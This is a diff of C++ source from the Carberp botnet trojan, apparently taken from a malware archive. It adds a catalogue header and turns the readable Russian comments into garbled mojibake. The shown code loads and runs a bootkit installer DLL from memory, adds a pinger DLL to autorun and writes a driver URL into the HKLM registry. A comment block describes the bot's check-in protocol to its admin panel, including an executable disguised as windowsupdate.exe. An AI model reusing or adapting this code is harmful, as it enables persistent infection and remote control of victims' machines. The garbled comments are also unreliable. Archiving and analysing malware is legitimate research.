@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 //---------------------------------------------------------------------------
 #include <Shlobj.h>
 
@@ -60,13 +71,13 @@ void AddRebootPingDllToAutorun()
 
 	PP_RETURNIF1(install == NULL);
 
-	// 123_d начало вызова Install для установки ping dll
+	// 123_d пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ Install пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ ping dll
 	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("123_d"));
 
 	BOOL install_result = install(dll_body, dll_body_size);
 	if (install_result)
 	{
-		// 124_d вызов Install для установки ping dll вернул TRUE
+		// 124_d пїЅпїЅпїЅпїЅпїЅ Install пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ ping dll пїЅпїЅпїЅпїЅпїЅпїЅ TRUE
 		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("124_d"));
 	}
 
@@ -85,7 +96,7 @@ void GetDriverUrl(char * UrlBuffer, DWORD UrlBufferSize)
 	PStrings Fields = Strings::Create();
 	AddURLParam(Fields, "cmd", "step");
 	AddURLParam(Fields, "uid", BotUid);
-	AddURLParam(Fields, "step", "170_dr"); //170_dr таймер драйвера
+	AddURLParam(Fields, "step", "170_dr"); //170_dr пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	PCHAR Params = Strings::GetText(Fields, "&");
 	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
@@ -114,7 +125,7 @@ bool SaveUrlForBootkitDriver()
 	DWORD key_created = (DWORD)RegCreateKeyExW(HKEY_LOCAL_MACHINE, key_path, 0, NULL, 0, KEY_WRITE, NULL, &key, &opt);
 	PP_RETURNIF2(key_created != ERROR_SUCCESS, false);
 
-	// Сохраняем на всякий пожарный с 0 в конце
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ 0 пїЅ пїЅпїЅпїЅпїЅпїЅ
 	DWORD url_value_set = (DWORD)RegSetValueExW(key, L"ID", 0, REG_BINARY, (const BYTE*)&url[0], 
 		(DWORD)plstrlenA(url));
 	PP_RETURNIF2(url_value_set != ERROR_SUCCESS, false);
@@ -127,33 +138,33 @@ bool SaveUrlForBootkitDriver()
 
 
 /*
-1. До ребута дропер отстукивает передавая ОС SP битность весь инстал буткита делается из проводника,
-если залочат бота на пункте 1,то 2,3 не произойдут,и мы увидим. сразу в бд регистрируется бот и у 
-него стату bkinstal= False
+1. пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ SP пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 1,пїЅпїЅ 2,3 пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,пїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅ 
+пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ bkinstal= False
 http://localhost/geter/index.php?cmd=beforerbt&uid=test1&os=XP_3_32
 
-2. Ставим буткита:
-2.1. bkinstal= False при не удачной инсталяции,длл возвращает код ошибки до 6 цифр,либо может даже ничего не вернуть,тогда в таблице писать пустоту.
+2. пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ:
+2.1. bkinstal= False пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ 6 пїЅпїЅпїЅпїЅ,пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ,пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 3. bkinstal= True
 
-http://localhost/geter/index.php?cmd=bkinstall&uid=test2&val=true/false/код ошибки
+http://localhost/geter/index.php?cmd=bkinstall&uid=test2&val=true/false/пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 3.reboot
-тут момент,мы отправляем в принудительный ребут,но он не всегда выполняется.как быть? подождать дня 2 ? предлагаю: запустить отдельный процесс свхоста который каждые 5 минут пишет в админку,I'm not rebooted может это конечно лишнее,но если в течении часа от такого бота был отстук,то можно не учитывать его в стате ботов,которые после ребута не отстучали(смотри пункт 9) 
+пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ,пїЅпїЅ пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ? пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ 2 ? пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ: пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 5 пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ,I'm not rebooted пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ,пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ(пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 9) 
 
-http://localhost/geter/index.php?cmd=rbt&uid=test2&val=notrbt/true/пустота
+http://localhost/geter/index.php?cmd=rbt&uid=test2&val=notrbt/true/пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 
-4. Cтучит драйвер из стека (каждые 3 минуты,на случай если инет не сразу у юзера стартует) драйвер шлёт гет запрос,в котором передаёт уид HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID 
+4. CпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅ 3 пїЅпїЅпїЅпїЅпїЅпїЅ,пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ) пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID 
 http://localhost/geter/index.php?cmd=drv&uid=test1&val=true
 
 
-5. стучит наша длл из свхост (каждые 3 минуты,на случай если инет не сразу у юзера стартует) 
+5. пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅ 3 пїЅпїЅпїЅпїЅпїЅпїЅ,пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ) 
 
 http://localhost/geter/index.php?cmd=dpl&uid=test1&val=true
 
 
-6. стучит просто ехешник с именем windowsupdate.exe в админку,передавая uid
+6. пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ windowsupdate.exe пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ,пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ uid
 
 http://localhost/geter/index.php?cmd=exe&uid=test1&val=true
 */
@@ -172,7 +183,7 @@ bool ExplorerStart(PEventData Data)
 	PP_DPRINTF(L"ExplorerStart: doing sending system information.");
 	PP_DBGRPT_FUNCTION_CALL(DebugReportCreateConfigReportAndSend());
 	
-	// 110_d - запуск ExplorerStart
+	// 110_d - пїЅпїЅпїЅпїЅпїЅпїЅ ExplorerStart
 	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("110_d"));
 
 	PP_DPRINTF(L"ExplorerStart: looking for setup dll...");
@@ -196,7 +207,7 @@ bool ExplorerStart(PEventData Data)
 		ULONG (*BkInstall)();
 		if ( BkInstall = (ULONG(*)())MemoryGetProcAddress(hLib,"BkInstall")  )
 		{
-			// 111_d - запуск установки
+			// 111_d - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("111_d"));
 
 			PP_DPRINTF(L"ExplorerStart: setup function found 0x%X. Calling it.", BkInstall);
@@ -205,7 +216,7 @@ bool ExplorerStart(PEventData Data)
 
 			if (ret == ERROR_SUCCESS)
 			{
-				//112_d установка успешна
+				//112_d пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("112_d"));
 
 				PP_DPRINTF(L"ExplorerStart: add pinger to autorun...");
